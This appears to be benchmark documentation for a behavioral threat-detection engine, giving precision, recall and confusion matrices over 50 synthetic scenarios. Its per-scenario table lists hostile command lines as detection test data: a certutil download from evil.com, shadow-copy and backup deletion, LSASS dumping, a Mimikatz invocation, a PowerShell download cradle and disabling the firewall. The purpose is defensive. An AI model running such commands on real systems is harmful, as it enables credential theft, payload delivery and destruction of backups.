# Detection Evaluation & Quality Benchmark

This document provides empirical evaluation evidence, testing methodologies, performance metrics, and documented operational limitations for the behavioral threat detection engine in **SOC Alert Analyzer**.

---

## 1. Evaluation Methodology & Ground Truth

To measure detection fidelity with scientific rigor and avoid unverified claims, detection heuristics are evaluated using automated unit evaluation test suites:
- **Development Baseline Suite**: [`tests/detection_eval/test_eval_host_behavioral.py`](../tests/detection_eval/test_eval_host_behavioral.py) (20 curated synthetic scenarios)
- **Held-Out Benchmark Suite**: [`tests/detection_eval/test_eval_held_out_benchmark.py`](../tests/detection_eval/test_eval_held_out_benchmark.py) (30 complex held-out scenarios, including difficult benign developer and system administration edge cases)
- **Standalone Evaluation Script**: [`scripts/evaluate_detection.py`](../scripts/evaluate_detection.py) (reproducible metric calculation and confusion matrix generation)

> [!IMPORTANT]
> **Evaluation Dataset Scope & Real-World Operational Context**:  
> The benchmark dataset comprises 50 curated synthetic process execution scenarios (25 malicious attack patterns and 25 difficult benign workflows) along with false-positive edge case regression tests. This dataset serves as a **deterministic regression test harness** to verify that behavioral heuristic rules execute accurately across platforms (Windows, Linux, macOS).  
> **A 100% benchmark score on these curated unit test scenarios does NOT represent 100% accuracy against unknown zero-days, evasive in-the-wild malware, or enterprise environments with unmonitored execution vectors.** Rule-based behavioral detection is strictly distinct from probabilistic machine learning.

---

## 2. Benchmark Results & Confusion Matrices

The metrics below are derived directly from the automated execution of `python scripts/evaluate_detection.py` and `pytest tests/detection_eval/ -v`.

### A. Held-Out Evaluation Benchmark (30 Scenarios)

| Metric | Measured Value | Formulation | Operational Meaning |
| :--- | :---: | :--- | :--- |
| **True Positives (TP)** | 15 | Correctly flagged malicious processes | All 15 held-out attack signatures successfully detected |
| **False Positives (FP)** | 0 | Benign processes incorrectly flagged | Zero false alarms triggered on difficult developer and administrative workflows |
| **True Negatives (TN)** | 15 | Correctly ignored benign processes | Legitimate compilers, diagnostics, and tools permitted without alert fatigue |
| **False Negatives (FN)** | 0 | Malicious processes missed | No missed detections within the defined held-out benchmark |
| **Precision** | **1.00 (100%)** | $\frac{\text{TP}}{\text{TP} + \text{FP}}$ | High fidelity on evaluated behavioral signatures |
| **Recall (Sensitivity)** | **1.00 (100%)** | $\frac{\text{TP}}{\text{TP} + \text{FN}}$ | Full coverage of targeted MITRE ATT&CK techniques in suite |
| **F1 Score** | **1.00 (100%)** | $\frac{2 \times \text{Precision} \times \text{Recall}}{\text{Precision} + \text{Recall}}$ | Harmonic mean of precision and recall |
| **False Positive Rate (FPR)** | **0.00 (0.0%)** | $\frac{\text{FP}}{\text{FP} + \text{TN}}$ | Zero false alarm rate across evaluated scenarios |
| **Accuracy** | **1.00 (100%)** | $\frac{\text{TP} + \text{TN}}{\text{Total}}$ | 30 / 30 correct classifications in held-out benchmark |

```
                     HELD-OUT CONFUSION MATRIX (30 Scenarios)
+-----------------------------+-----------------------------+
|                             |        ACTUAL CLASS         |
|                             |   Malicious   |   Benign    |
+-----------------------------+---------------+-------------+
| PREDICTED | Detected Threat | TP = 15       | FP = 0      |
|   CLASS   | Benign / Passed | FN = 0        | TN = 15     |
+-----------------------------+---------------+-------------+
```

---

### B. Development Baseline Dataset (20 Scenarios)

| Metric | Measured Value | Formulation | Operational Meaning |
| :--- | :---: | :--- | :--- |
| **True Positives (TP)** | 10 | Correctly flagged malicious processes | All 10 baseline attack signatures successfully detected |
| **False Positives (FP)** | 0 | Benign processes incorrectly flagged | Zero false alarms triggered on standard benign workflows |
| **True Negatives (TN)** | 10 | Correctly ignored benign processes | Normal developer and administrative activity permitted |
| **False Negatives (FN)** | 0 | Malicious processes missed | No missed detections within the baseline scenarios |
| **Precision** | **1.00 (100%)** | $\frac{\text{TP}}{\text{TP} + \text{FP}}$ | High baseline fidelity |
| **Recall (Sensitivity)** | **1.00 (100%)** | $\frac{\text{TP}}{\text{TP} + \text{FN}}$ | Full baseline coverage |
| **F1 Score** | **1.00 (100%)** | $\frac{2 \times \text{Precision} \times \text{Recall}}{\text{Precision} + \text{Recall}}$ | Optimal baseline harmony |
| **False Positive Rate (FPR)** | **0.00 (0.0%)** | $\frac{\text{FP}}{\text{FP} + \text{TN}}$ | Zero baseline false positive rate |
| **Accuracy** | **1.00 (100%)** | $\frac{\text{TP} + \text{TN}}{\text{Total}}$ | 20 / 20 correct classifications |

```
                    BASELINE CONFUSION MATRIX (20 Scenarios)
+-----------------------------+-----------------------------+
|                             |        ACTUAL CLASS         |
|                             |   Malicious   |   Benign    |
+-----------------------------+---------------+-------------+
| PREDICTED | Detected Threat | TP = 10       | FP = 0      |
|   CLASS   | Benign / Passed | FN = 0        | TN = 10     |
+-----------------------------+---------------+-------------+
```

---

### C. Combined Benchmark Summary (50 Total Scenarios)

- **Total Samples Evaluated**: 50 (25 Malicious, 25 Benign)
- **Overall True Positives (TP)**: 25
- **Overall False Positives (FP)**: 0
- **Overall True Negatives (TN)**: 25
- **Overall False Negatives (FN)**: 0
- **Overall Precision**: **1.0000 (100.0%)**
- **Overall Recall**: **1.0000 (100.0%)**
- **Overall F1 Score**: **1.0000 (100.0%)**
- **Overall False Positive Rate (FPR)**: **0.0000 (0.0%)**
- **Overall Accuracy**: **1.0000 (100.0%)**

---

## 3. Per-Scenario Evaluation Breakdown

### Held-Out Evaluation Dataset (30 Scenarios)

| Scenario ID | Category | MITRE Technique | Process Name & Command Line Indicator | Engine Result |
| :--- | :--- | :---: | :--- | :---: |
| `held_out_webshell_nginx` | Malicious | `T1505.003` | `nginx` spawning `bash -i` | **TP** |
| `held_out_maldoc_powerpnt` | Malicious | `T1204.002` | `powerpnt.exe` spawning hidden encoded `powershell.exe` | **TP** |
| `held_out_ransomware_wmic` | Malicious | `T1490` | `wmic.exe shadowcopy delete` | **TP** |
| `held_out_ransomware_wbadmin` | Malicious | `T1490` | `wbadmin.exe delete catalog -quiet` | **TP** |
| `held_out_masquerading_lsass` | Malicious | `T1036.005` | `lsass.exe` running from `C:\Users\Public\` | **TP** |
| `held_out_masquerading_csrss` | Malicious | `T1036.005` | `csrss.exe` running from `C:\Temp\` | **TP** |
| `held_out_offensive_bloodhound` | Malicious | `T1059` | `bloodhound.exe` standalone execution | **TP** |
| `held_out_offensive_xmrig` | Malicious | `T1496` | `xmrig.exe -o stratum+tcp://pool:3333` | **TP** |
| `held_out_offensive_psexec` | Malicious | `T1059` | `psexec.exe \\target cmd.exe` | **TP** |
| `held_out_encoded_pwsh` | Malicious | `T1059.001` | `pwsh.exe -encodedcommand SQBFAFgA` | **TP** |
| `held_out_cradle_iex` | Malicious | `T1059.001` | `powershell.exe -nop -c IEX ... DownloadFile` | **TP** |
| `held_out_cred_procdump` | Malicious | `T1003` | `procdump.exe -ma lsass.exe lsass.dmp` | **TP** |
| `held_out_cred_sekurlsa` | Malicious | `T1003` | `powershell.exe Invoke-Mimikatz ... sekurlsa` | **TP** |
| `held_out_certutil_ingress` | Malicious | `T1105` | `certutil.exe -urlcache -split -f http://evil.com/x.exe` | **TP** |
| `held_out_firewall_disabled` | Malicious | `T1562.001` | `netsh.exe advfirewall set allprofiles state off` | **TP** |
| `held_out_benign_dev_git` | Benign | N/A | `git.exe commit -m "Security patch"` | **TN** |
| `held_out_benign_dev_cargo` | Benign | N/A | `cargo.exe build --release` | **TN** |
| `held_out_benign_dev_npm` | Benign | N/A | `npm.cmd run build` | **TN** |
| `held_out_benign_sys_ping` | Benign | N/A | `ping.exe -n 4 192.168.1.1` | **TN** |
| `held_out_benign_sys_tracert` | Benign | N/A | `tracert.exe 8.8.8.8` | **TN** |
| `held_out_benign_sys_tasklist` | Benign | N/A | `tasklist.exe /v` | **TN** |
| `held_out_benign_sys_systeminfo` | Benign | N/A | `systeminfo.exe` | **TN** |
| `held_out_benign_netsh_status` | Benign | N/A | `netsh.exe advfirewall show allprofiles` (read-only) | **TN** |
| `held_out_benign_certutil_verify` | Benign | N/A | `certutil.exe -verify C:\Certs\webserver.crt` | **TN** |
| `held_out_benign_notepad_shadow` | Benign | N/A | `notepad.exe C:\Docs\ShadowCopyGuide.txt` | **TN** |
| `held_out_benign_python_pytest` | Benign | N/A | `python.exe -m pytest -v` | **TN** |
| `held_out_benign_powershell_diag`| Benign | N/A | `powershell.exe Get-NetIPAddress -AddressFamily IPv4` | **TN** |
| `held_out_benign_appdata_slack` | Benign | N/A | `slack.exe` from `\AppData\Local\Programs\Slack\` | **TN** |
| `held_out_benign_system32_csrss` | Benign | N/A | `C:\Windows\System32\csrss.exe` | **TN** |
| `held_out_benign_vscode_updater`| Benign | N/A | `Code_installer.exe /silent` from `\Temp\` | **TN** |

---

## 4. Reproducible Evaluation Commands

To independently reproduce the evaluation benchmarks:

```bash
# Execute standalone benchmark script (confusion matrices, metric summaries)
python scripts/evaluate_detection.py

# Run pytest on evaluation suites
python -m pytest tests/detection_eval/ -v
```

---

## 5. False-Positive Edge Cases & Allowlist Verification

Automated regression tests ([`test_eval_false_positive_edge_cases_and_suppression`](../tests/detection_eval/test_eval_host_behavioral.py) and [`test_held_out_ambiguous_and_duplicate_handling`](../tests/detection_eval/test_eval_held_out_benchmark.py)) specifically verify edge cases to prevent alert fatigue:

1. **Alternate Valid Windows Subsystems**: `C:\Windows\SysWOW64\svchost.exe` is recognized as a valid 32-bit compatibility path and does not trigger masquerading alerts.
2. **Ambiguous Keyword Overlaps**: Non-malicious commands containing keywords in benign contexts (e.g., `powershell.exe Get-ChildItem C:\ShadowBackups` or `notepad.exe ShadowCopyGuide.txt`) do not trigger ransomware defense evasion rules.
3. **Legitimate User-Space Software**: Desktop tools installed in `%LOCALAPPDATA%\Programs\` (e.g., Slack, VS Code) are not confused with temporary folder malware.
4. **Duplicate Alert Suppression**: Rapid repeated observations of identical process signatures are suppressed via in-memory deduplication (`seen_signatures`).
5. **Configurable Suppressions**: Enterprise software or authorized administrative scripts can be added to `HostSecuritySensor.PROCESS_SUPPRESSIONS` to bypass detection without modifying rule logic.

---

## 6. Documented Operational Boundaries & Limitations

1. **User-Space EDR-Lite**: The host sensor runs as a user-space monitoring process (`psutil`, socket inspection, and OS event logs). It does not deploy kernel drivers (ELAM, minifilters, or eBPF).
2. **Memory Injection & Direct Syscalls**: Attack techniques that do not spawn new processes, do not create listening sockets, or execute directly via reflective DLL injection or direct unhooked syscalls in existing trusted processes cannot be observed by user-space process polling alone.
3. **LOLBin Behavioral Thresholding**: PowerShell heuristics use a weighted scoring system (`lolbin_weight >= 3`). A single flag (such as `-ExecutionPolicy Bypass` used by legitimate backup scripts) does not trigger an alert by itself. Highly obfuscated cradles that evade string matching may require deeper script block logging (Event ID 4104) enabled on the host.
4. **Cross-Platform Parity**: The sensor normalizes process paths across Windows, Linux, and macOS. Process masquerading rules for Windows core binaries execute consistently regardless of the host OS, supporting multi-platform backend deployments and containerized testing.
